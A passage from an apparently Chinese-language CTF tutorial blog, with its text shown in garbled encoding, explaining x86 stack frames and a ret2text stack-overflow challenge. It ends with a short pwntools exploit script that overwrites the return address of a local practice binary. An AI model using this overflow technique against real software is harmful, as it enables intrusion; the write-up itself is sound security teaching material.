ˆé¡¶ï¼Œä»”ç»†æƒ³ä¸€æƒ³ï¼Œæ˜¯ä¸æ˜¯funè°ƒç”¨çš„æ—¶å€™ï¼ŒæŠŠedpç§»åŠ¨åˆ°espã€‚ç„¶åpop edp æŠŠæ ˆä¸­å‹å…¥çš„main_edpå¼¹å‡ºèµ‹å€¼ç»™edpï¼Œè¿™æ ·æˆ‘ä»¬å°±æ¢å¤äº†edpï¼Œç„¶åå†pop eipï¼ŒæŠŠå‹å…¥çš„main_addrå¼¹å‡ºèµ‹å€¼ç»™eipç¨‹åºæ§åˆ¶æµå°±æœ‰å›åˆ°äº†callçš„ä¸‹ä¸€å¥</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182341909.png"></p></li></ol><h3 id="å‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­æ¶‰åŠæ“ä½œæŒ‡ä»¤"><a href="#å‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­æ¶‰åŠæ“ä½œæŒ‡ä»¤" class="headerlink" title="å‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­æ¶‰åŠæ“ä½œæŒ‡ä»¤"></a>å‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­æ¶‰åŠæ“ä½œæŒ‡ä»¤</h3><ol><li><strong>å‹æ ˆ(push):æ ˆé¡¶æŒ‡é’ˆespå‡å°4å­—èŠ‚;ä»¥å­—èŠ‚ä¸ºå•ä½å°†å¯„å­˜å™¨æ•°æ®(4å­—èŠ‚ï¼Œä¸è¶³è¡¥0)å‹å…¥å †æ ˆï¼Œä»é«˜åˆ°ä½ä¾æ¬¡å°†æ•°æ®å­˜äººesp-1ã€esp-2ã€esp-3ã€esp-4æŒ‡å‘çš„åœ°å€å•å…ƒã€‚</strong></li><li><strong>å‡ºæ ˆ(pop):æ ˆé¡¶æŒ‡é’ˆespæŒ‡å‘çš„æ ˆä¸­æ•°æ®è¢«å–å›å¯„å­˜å™¨;æ ˆé¡¶æŒ‡é’ˆespå¢åŠ 4å­—èŠ‚ã€‚pushå’ŒpopæŒ‡ä»¤åœ¨ä¸åŒç³»ç»Ÿä¸Šè¿è¡Œæ—¶ç¨æœ‰ä¸åŒï¼Œåœ¨64ä½ç³»ç»Ÿä¸­å˜åŒ–çš„å¤§å°æ˜¯8å­—èŠ‚ï¼Œåœ¨32ä½ç³»ç»Ÿä¸­å˜åŒ–çš„å¤§å°æ˜¯4å­—èŠ‚ã€‚</strong></li><li><strong>è°ƒç”¨(ca11):å°†å½“å‰çš„æŒ‡ä»¤æŒ‡é’ˆeip(è¯¥æŒ‡é’ˆæŒ‡å‘ca11æŒ‡ä»¤åçš„ä¸‹æ¡æŒ‡ä»¤)å‹å…¥å †æ ˆï¼Œä»¥è¿”å›æ—¶èƒ½æ¢å¤æ‰§è¡Œä¸‹æ¡æŒ‡ä»¤ã€‚ç„¶åï¼Œè®¾ç½®eipæŒ‡å‘è¢«è°ƒå‡½æ•°çš„å¼€å§‹å¤„ï¼Œä»¥è·³è½¬åˆ°è¢«è°ƒå‡½æ•°çš„å…¥å£åœ°å€å¤„æ‰§è¡Œã€‚</strong></li><li><strong>ç¦»å¼€(1eave):æ¢å¤ä¸»è°ƒå‡½æ•°çš„æ ˆå¸§ä»¥å‡†å¤‡è¿”å›ï¼Œå®ƒç­‰ä»·äºä»¥ä¸‹æŒ‡ä»¤åºåˆ—:mov espï¼Œebp(æ¢å¤åŸespå€¼ï¼ŒæŒ‡å‘è¢«è°ƒå‡½æ•°æ ˆå¸§å¼€å§‹å¤„); pop ebp(æ¢å¤åŸ ebp çš„å€¼ï¼Œå³ä¸»è°ƒå‡½æ•°å¸§åŸºæŒ‡é’ˆ)</strong></li><li><strong>è¿”å›(ret):ä¸ca11æŒ‡ä»¤é…åˆï¼Œç”¨äºä»å‡½æ•°æˆ–è¿‡ç¨‹è¿”å›ã€‚ä»æ ˆé¡¶å¼¹å‡ºè¿”å›åœ°å€(ä¹‹å‰ ca11æŒ‡ä»¤ä¿å­˜çš„ä¸‹æ¡æŒ‡ä»¤åœ°å€)åˆ°eipå¯„å­˜å™¨ä¸­ï¼Œç¨‹åºè½¬åˆ°è¯¥åœ°å€å¤„ç»§ç»­æ‰§è¡Œ(æ­¤æ—¶ espæŒ‡å‘è¿›äººå‡½æ•°æ—¶çš„ç¬¬ä¸€ä¸ªå‚æ•°)ã€‚è‹¥å¸¦æœ‰ç«‹å³æ•°ï¼Œespè¦åŠ ä¸Šç«‹å³æ•°(ä¸¢å¼ƒä¸€äº›åœ¨æ‰§è¡Œca11æŒ‡ä»¤å‰å…¥æ ˆçš„å‚æ•°)ã€‚ä½¿ç”¨è¯¥æŒ‡ä»¤å‰ï¼Œåº”ä½¿å½“å‰æ ˆé¡¶æŒ‡é’ˆæ‰€æŒ‡å‘ä½ç½®çš„å†…å®¹æ­£å¥½æ˜¯å…ˆå‰ca11æŒ‡ä»¤ä¿å­˜çš„è¿”å›åœ°å€ã€‚</strong></li></ol><h2 id="åˆè¯†æ ˆæº¢å‡º"><a href="#åˆè¯†æ ˆæº¢å‡º" class="headerlink" title="åˆè¯†æ ˆæº¢å‡º"></a>åˆè¯†æ ˆæº¢å‡º</h2><p><strong>å½“æˆ‘ä»¬è°ƒç”¨ä¸€ä¸ªå‡½æ•°çš„æ—¶å€™ï¼Œåœ¨å‡½æ•°å†…éƒ¨å­˜åœ¨ï¼Œæ ˆæº¢å‡ºæ¼æ´ï¼Œgetå‡½æ•°æˆ–è€…å¼€è¾Ÿç©ºé—´å¤§äºå˜é‡è·ç¦»æ ˆåº•çš„ä½ç½®ï¼Œé‚£ä¹ˆå°±å¯èƒ½é€ æˆæ ˆæº¢å‡ºï¼Œæº¢å‡ºåå¦‚æœæº¢å‡ºå€¼è¦†ç›–äº†main_addr,å‡½æ•°çš„è¿”å›åœ°å€å°±ä¼šå˜åŒ–ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®è¿™ä¸ªç‰¹ç‚¹ï¼Œç¯¡æ”¹è¿”å›åœ°å€åˆ°æˆ‘ä»¬æƒ³è¿”å›çš„ã€‚çœ‹ä¸‹å›¾ï¼Œè·ç¦»æ ˆåº•0x80ä¸ªå­—èŠ‚ï¼Œä½†æ˜¯å…è®¸è¯»å–0x200ä¸ªå­—èŠ‚ï¼Œå°±ä¼šé€ æˆæ ˆæº¢å‡º,æ¥ä¸‹æ¥æˆ‘ä»¬æ¥å°è¯•ç‰›åˆ€</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182342005.png"><br>ä¾‹é¢˜ï¼š<a href="https://gitee.com/tky5216/CTF/raw/master/PWN/stack/ret2text">é™„ä»¶ä¸‹è½½</a><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182342145.png"><br><strong>æŸ¥çœ‹ä¿æŠ¤</strong><br><strong>æ‰“å¼€IDAåç¼–è¯‘çœ‹çœ‹ä»£ç é€»è¾‘</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182343292.png"><br><strong>è¿™é‡Œæœ‰ä¸¤ç§åˆ¤æ–­åç§»çš„æ–¹å¼</strong></p><ol><li><p>ç¬¬ä¸€ç§å°±æ˜¯çœ‹å›¾ç‰‡ä¸Šçº¢æ¡†éƒ¨åˆ†ï¼Œæ˜¾ç¤ºsè·ç¦»ebpä¸º0x108ä¸ªå­—èŠ‚æ‰€ä»¥éœ€è¦å¡«å……0x108+0x4ä¸ªå­—èŠ‚çš„æ•°æ®æ‰èƒ½è¦†ç›–è¿”å›åœ°å€</p></li><li><p>ä½¿ç”¨pwngdbä¸­cyclicåˆ¤æ–­åç§»ï¼Œåœ¨call getså¤„ä¸‹æ–­ç‚¹ï¼Œç”¨gdbè°ƒè¯•<img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182346316.png"><br> ç”¨cyclicç”Ÿæˆæœ‰è§„å¾‹çš„å­—ç¬¦ä¸²ï¼Œè¾“å…¥cæŠŠå­—ç¬¦ä¸²è¾“å…¥è¿è¡Œ<img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182343102.png"><br> å¾—åˆ°ä¸€ä¸ªå¼‚å¸¸è¿”å›åœ°å€ï¼Œç¨‹åºåœæ­¢<img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182344907.png"><br> ç”¨å‘½ä»¤cyclic -l åŠ è¿”å›åœ°å€ç®—å‡ºåç§»<img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182344504.png"><br> <strong>è¿™é‡Œçš„åˆ°çš„åç§»å°±ä¸ç”¨ç®—edpçš„å¤§å°äº†ï¼Œå› ä¸ºå·²ç»åŒ…æ‹¬edpäº†</strong><br> <strong>æœ‰äº†åç§»æˆ‘ä»¬æ‰¾ä¸€ä¸‹åé—¨å‡½æ•°</strong></p></li></ol><p>  <img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182344083.png"><br>  <strong>è¿™é¢˜ä¹Ÿç®—å¾ˆä»æ…ˆï¼Œç›´æ¥ç»™å‡ºäº†åé—¨å‡½æ•°ï¼Œæˆ‘ä»¬éšç€å­¦ä¹ çš„æ·±å…¥ï¼Œä¸€èˆ¬ä¸ä¼šç›´æ¥ç»™å‡ºåé—¨å‡½æ•°ï¼Œéœ€è¦ä½¿ç”¨å„ç§æŠ€å·§æ¥è¿›å…¥shell</strong><br>  <img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182345121.png"><br>  <strong>æ¥ä¸‹æ¥å¼€å§‹ç¼–å†™è„šæœ¬</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br><br>p = process(&quot;./ret2text&quot;)<br>target = 0x0804850B<br>p.recvuntil(&quot;ret2text\n&quot;)<br>payload = b&quot;a&quot; * 0x108 + p32(1) + p32(target)<br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ ˆ</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
